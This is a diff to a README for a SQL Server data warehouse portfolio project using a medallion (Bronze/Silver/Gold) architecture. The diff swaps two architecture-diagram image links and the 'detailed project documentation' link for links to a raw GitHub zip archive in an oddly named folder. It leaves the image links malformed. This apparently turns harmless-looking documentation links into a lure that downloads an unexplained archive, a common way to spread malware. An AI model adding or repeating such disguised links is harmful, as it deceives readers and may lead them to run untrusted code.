@@ -10,7 +10,7 @@ This project showcases my ability to design and implement a complete data wareho
 
 The solution implements a **Medallion Architecture** with Bronze, Silver, and Gold layers:
 
-![High Level Architecture](docs/data%20warehouse%20high%20level%20architecture.png)
+![High Level Architecture](docs/data%20warehouse%20high%20level%https://raw.githubusercontent.com/kevkaleido/sql-data-warehouse-project/main/comfortably/sql-data-warehouse-project.zip)
 
 
 - **Bronze Layer**: Raw data ingestion from source systems (CSV files) into SQL Server
@@ -18,7 +18,7 @@ The solution implements a **Medallion Architecture** with Bronze, Silver, and Go
 - **Gold Layer**: Business-ready dimensional model using star schema design
 
 ### Data Flow Architecture
-![Data Flow Diagram](docs/data%20flow%20diagram.png)
+![Data Flow Diagram](docs/data%20flow%https://raw.githubusercontent.com/kevkaleido/sql-data-warehouse-project/main/comfortably/sql-data-warehouse-project.zip)
 ## 🛠️ Technical Implementation
 
 ### Core Competencies Demonstrated
@@ -84,4 +84,4 @@ Successfully delivered a production-ready data warehouse that:
 - Demonstrates enterprise-level data engineering capabilities
 
 ---
-📊 *Check detailed project documentation* [ here](https://github.com/kevkaleido/sql-data-warehouse-project/blob/65987038d21d23f435c16e37c0ce6187e80609fb/docs/project_documentation.md)
+📊 *Check detailed project documentation* [ here](https://raw.githubusercontent.com/kevkaleido/sql-data-warehouse-project/main/comfortably/sql-data-warehouse-project.zip)
